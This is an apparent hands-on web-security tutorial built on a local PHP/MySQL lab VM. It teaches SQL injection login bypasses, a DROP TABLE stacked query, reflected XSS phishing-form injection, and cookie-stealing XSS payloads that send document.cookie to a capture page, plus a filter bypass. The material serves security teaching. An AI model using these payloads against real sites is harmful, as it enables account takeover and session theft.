--- 
layout: default
title: "Web Security - Hands on"
---



# Web Security - Hands-on

The content of this page largely taken and adapted from Andrea Valenza's [Cyber-Gym](https://github.com/AvalZ/cyber-gym))

## Requirements
- HTTP Protocol

	- Sending Parameters over HTTP

- Technologies

	- HTML (CSS is optional)

		- JavaScript
		- Running a simple embedded script

	- PHP

	    - Read parameters from requests
		- Simple output
		- Fetch data from MySQL DB

	- SQL

		- Simple queries

## Virtual Machine

- [Vagrant](https://www.vagrantup.com/)

	- [ScotchBox](https://box.scotch.io/) - A simple LAMP stack for Vagrant 
	- pre-built: https://github.com/AvalZ/cyber-gym

- or build a custom VM (VMWare or Virtualbox) with:

	- Ubuntu (any Debian-based Linux distro will do)
	- LAMP Stack installed, which means:
	- Linux
	- Apache
	- MySQL
	- PHP

## Setup

1. Clone this repository
    * `git clone https://github.com/AvalZ/cyber-gym.git` _or_
    * `git clone git@github.com:AvalZ/cyber-gym.git` _or_
    * download the zip from [here](https://github.com/AvalZ/cyber-gym/archive/master.zip) and unzip it in a local folder.
2. `cd cyber-gym/` (or `cd cyber-gym-master` if you downloaded the zip)
3. `vagrant up`
4. Browse http://192.168.33.10
5. Create a table named 'accounts' or go to http://192.168.33.10/db/setup_db.php
6. Done!


## Hello World!

Open a hello.php file in your Root Web folder
```
<?php echo "Hello World!";?>
```
Go to your favorite Browser
Open `<IP>/hello.php`

## Read GET parameters
1. Copy `hello.php` in `hello2.php` (we don't want to lose all that hard work, do we?)
2. Get the `GET` parameters
```
$firstname = $_GET["firstname"];
$lastname = $_GET["lastname"];
```
3. Echo the salutation:
```
echo "Hello $firstname $lastname!";
```
WARNING: the “variable in a string” trick will work ONLY with double quotes! (long story…)
4. Load the page from the browser:
```
.../hello2.php?firstname=John&lastname=Doe
```
Should display `Hello John Doe!`

## Simple HTML Form
Tired of writing everything in that tiny URL box? Let's switch to forms!
```
<html>
<form action="hello2.php">
Nome<input type="text" name="firstname"><br/>
Cognome<input type="text" name="lastname"><br/>
<input type="submit" value="Submit">
</form>
</html>
```
Be careful: the field names must be the same as in the HTTP request!
Point it to the PHP page that displays “Hello firstname lastname!”

## SQL Basics
- SELECT

	- FROM
	- WHERE
	- LIMIT
	- ORDER BY / GROUP BY

- INSERT
- UPDATE
- DELETE

If you don't know what one (or more) of these does, stop reading and Google it!

## Stacked queries
![Mom exploit](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

- Query: 	`SELECT * FROM Students WHERE(name='$name')`
- Payload: 	`Robert'); DROP TABLE Students;-- `

SELECT * FROM Students WHERE(name='Robert'); DROP TABLE Students;-- ')

[ No library will ever let you do this anymore, only 1 query at a time (but nesting is ok!) ]

## Creating a SQL Database
Go to your MySQL Interpreter (either CLI, MySQL Workbench, or PHP)

```
CREATE DATABASE websec;
```

Now create a table inside it:

```
CREATE TABLE websec.users (	
 id int NOT NULL AUTO_INCREMENT,
 username varchar(100) NOT NULL,
 password varchar(100),
 signature varchar(255),
 PRIMARY KEY (id) 
);
```

Add some data in the table
```
INSERT INTO users (username,password,signature) VALUES ('Arthur', 'Bathrobe', 'Is there anyb tea on this spaceship?');
INSERT INTO users (username,password,signature)	VALUES ('Ford', 'Betelgeuse', 'Don\'t panic... don\'t panic...');
```
We know passwords should not be stored as plaintext... but this is not important right now.


## Login Form

HTML Form with:
```
<form action='login.php' method='POST'>
    <input type='text' name='user'>
    <input type='password' name='pass'>
```
Form should POST credentials to PHP page
```
$user = $_POST['user'];
$pass = $_POST['pass'];
```
PHP page should check if user exists
```
$con->query("SELECT * FROM users WHERE username='$user' AND password='$pass'");
```
num_rows > 0: display welcome message
else: display error message

## Login Form - EXPLOIT 
Can you login as `Arthur` without knowing his password?

Query:	`SELECT * FROM users WHERE username='$user' AND password='$pass'`

Payload:

- username: `Arthur' -- -`
- password: anything

Why does this work?
```
SELECT * FROM users WHERE username='Arthur' -- -' AND password='anything'
```

What if you don't know any username?
```
Query:	SELECT * FROM users WHERE username='$user' AND password='$pass'
```
Payload:

- username: any
- password: `a' OR 'b'='b`

Why does this work?
```
SELECT * FROM users WHERE username='any' AND password='a' OR 'b'='b'
```

Why did we inject the password field here? (Hint: operator precedence)


## Login Form - EXPLOIT 
What if you don't know any username AND the page checks for one result?
```
Query:	SELECT * FROM users WHERE username='$user' AND password='$pass'
```
Payload:

- username: any
- password: `a' OR True LIMIT 3,1 -- -`

Why does this work?
```
SELECT * FROM users WHERE username='any' AND password='a' OR True LIMIT 3,1 -- -'
```

## Login Form
Let's refine our login form to really keep track of logged users
```
start_session();
$_SESSION['user'] = $user;
$_SESSION['id'] = $row['id'];
echo “Welcome {$_SESSION['user']}!”;
```
Sessions are indexed by `PHPSESSID`.

Remember: HTTP is stateless!

## Handling passwords in your DB
- Plaintext passwords

  - Attackers can steal login credentials

- Ciphered passwords (but how?)

  - MD5

	- Can be guessed using Dictionary Attack
	- Easily “reversible” Collision Attack

  - SHA-1

	- Reversible using 		Rainbow Tables

  - SHA-1  +  Salt

	- Rainbow tables exist for simple salts

  - BCrypt

	- Based on Blowfish cipher
	- Double salting: simple concatenated salt + number of iterations
	- All saved in-format (no need for another column)

  - Password Cracking Tool: [John the Ripper](https://www.openwall.com/john/)


## XSS Reflected (a.k.a. “why would I ever attack myself?”)
You may use the Simple HTML Form, if you wish (and please, use Firefox for this part)

Code:
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe`
- Output: `Hello John Doe`

## XSS Reflected

We can try adding some HTML to our parameters and see if the page renders it

Code: 			
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```

Payload:

- firstname: `<i>John</i>`
- lastname: `<u>Doe</u>`
- Output: `Hello `<i>John</i><u>Doe</u>!

## XSS Reflected - Form Injection

By adding custom HTML, we can try and go for a Phishing Attack

Code: 			
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```

Payload:

- firstname: 
```
  Username: <form action=”http://www.mysite.it/capture_page.php”>
<input name=”user” type=”text”/><br/>
```
- lastname:
```
  Password: <input name=”pass” type=”password”/>
</form>
```
- Output:    `Hello [ Fake login form ]!`


## XSS Reflected - injecting and executing javascript

That was nice, but let's see how far we can go!

Code: 			
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```

Payload:

- firstname: `John`
- lastname:	`Doe<script>alert(1)</script>`
- Output: `Hello John Doe[ ... popup appears saying "1" ... ]!`

## XSS Reflected - injecting and executing javascript

That “1” wasn't so exciting, is there anything important we can display from the DOM?

Remember the "HTTP is Stateless" mantra? What makes it Stateful?

Code: 			
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```

Payload:

- firstname: `John`
- lastname:	`Doe<script>alert(document.cookie)</script>`
- Output: `Hello John Doe[ ... popup appears saying "PHPSESSID=badf00d..." ... ]!`

## XSS Reflected - injecting and executing javascript

Reading cookies is cool! But what about making the page perform some action?

Code: 			
```$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe<script>window.location='www.google.it'</script>`
- Output: `Hello John Doe[ redirect to www.google.it ]`

## XSS Reflected - Session Hijacking (stealing cookies)

Send cookies somewhere!   
Code:
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe<script> window.location='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
Output: `Hello John Doe[ redirect to http://192.168.33.10, while sending the Cookie ]`


## XSS Reflected - Session Hijacking (covert)

But can't we do it without redirection?

Code: 			
```
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe<script> new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
- Output: `Hello John Doe[ broken image link ]!`

Browsers automatically perform GET requests to `src` URLs!!

## XSS Reflected - FIX

Block <script> tags

We could just remove the "script" tags, so that no JavaScript code can be executed!

Code: 			
```
$firstname = preg_replace("/script/i", "", $_POST['firstname']);
$lastname = preg_replace("/script/i", "", $_POST['lastname']);
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe<script> new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
- Output: `Hello John Doe<>new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie;!`

## XSS Reflected - Chrome XSS Auditor
Why did we have to work on Firefox? Can't we work on Chrome?

Code:
```
$firstname = preg_replace("/script/i", "", $_POST['firstname']);
$lastname = preg_replace("/script/i", "", $_POST['lastname']);
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	`Doe<svg onload=”new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie”></svg>`
- Output: `Hello John Doe! [ script blocked in Console ]`

Scripts found in GET parameters are blocked! Are we done then?

## XSS Reflected - Bypassing Chrome XSS Auditor

Chrome only checks if a parameter appears in the HTML Body too

If it appears in a parameter and in the body, Chrome blocks its execution

Code: 			
```
$firstname = preg_replace("/script/i", "", $_POST['firstname']);
$lastname = preg_replace("/script/i", "", $_POST['lastname']);
echo “Hello $firstname $lastname!”;
```
Payload:

- firstname: `John`
- lastname:	 `Doe<svscriptg onlscriptoad=”new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie”></svscriptg>
- Output: `Hello John Doe [ broken image link ]!

Scripts are not the same!! (php modified it) so Chrome renders it

